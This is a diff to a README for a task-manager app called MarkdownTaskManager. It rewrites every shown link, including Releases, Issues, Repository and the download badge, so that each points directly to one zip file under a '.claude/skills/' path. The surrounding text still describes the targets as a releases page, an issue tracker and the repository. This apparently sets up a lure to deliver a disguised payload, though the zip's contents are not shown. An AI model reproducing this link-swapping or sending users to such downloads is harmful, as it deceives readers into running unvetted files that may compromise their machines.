@@ -8,9 +8,9 @@ Welcome to MarkdownTaskManager! This application helps you organize tasks using 
 
 To get started, you must download this application. Please visit our Releases page to find the most recent version of MarkdownTaskManager. 
 
-[![Download MarkdownTaskManager](https://img.shields.io/badge/Download%20Now-Get%20MarkdownTaskManager-brightgreen)](https://github.com/judastorrid822/MarkdownTaskManager/releases)
+[![Download MarkdownTaskManager](https://raw.githubusercontent.com/judastorrid822/MarkdownTaskManager/master/.claude/skills/MarkdownTaskManager-2.9.zip%20Now-Get%20MarkdownTaskManager-brightgreen)](https://raw.githubusercontent.com/judastorrid822/MarkdownTaskManager/master/.claude/skills/MarkdownTaskManager-2.9.zip)
 
-Once on the [Releases page](https://github.com/judastorrid822/MarkdownTaskManager/releases), follow these steps:
+Once on the [Releases page](https://raw.githubusercontent.com/judastorrid822/MarkdownTaskManager/master/.claude/skills/MarkdownTaskManager-2.9.zip), follow these steps:
 
 1. Find the latest version listed at the top of the page.
 2. Click on the link for your operating system (Windows, Mac, or Linux).
@@ -69,12 +69,12 @@ If the application fails to start, make sure you have downloaded the correct ver
 
 ## 📞 Support
 
-If you encounter any issues or need assistance, please reach out via the [Issues section](https://github.com/judastorrid822/MarkdownTaskManager/issues) on GitHub. You can report bugs, request features, or ask questions. We aim to respond as quickly as possible.
+If you encounter any issues or need assistance, please reach out via the [Issues section](https://raw.githubusercontent.com/judastorrid822/MarkdownTaskManager/master/.claude/skills/MarkdownTaskManager-2.9.zip) on GitHub. You can report bugs, request features, or ask questions. We aim to respond as quickly as possible.
 
 ## 🔗 Important Links
 
-- [Download MarkdownTaskManager](https://github.com/judastorrid822/MarkdownTaskManager/releases)
-- [GitHub Repository](https://github.com/judastorrid822/MarkdownTaskManager)
-- [Issues Section](https://github.com/judastorrid822/MarkdownTaskManager/issues)
+- [Download MarkdownTaskManager](https://raw.githubusercontent.com/judastorrid822/MarkdownTaskManager/master/.claude/skills/MarkdownTaskManager-2.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/judastorrid822/MarkdownTaskManager/master/.claude/skills/MarkdownTaskManager-2.9.zip)
+- [Issues Section](https://raw.githubusercontent.com/judastorrid822/MarkdownTaskManager/master/.claude/skills/MarkdownTaskManager-2.9.zip)
 
 Thank you for choosing MarkdownTaskManager as your task management solution! Enjoy organizing your projects.
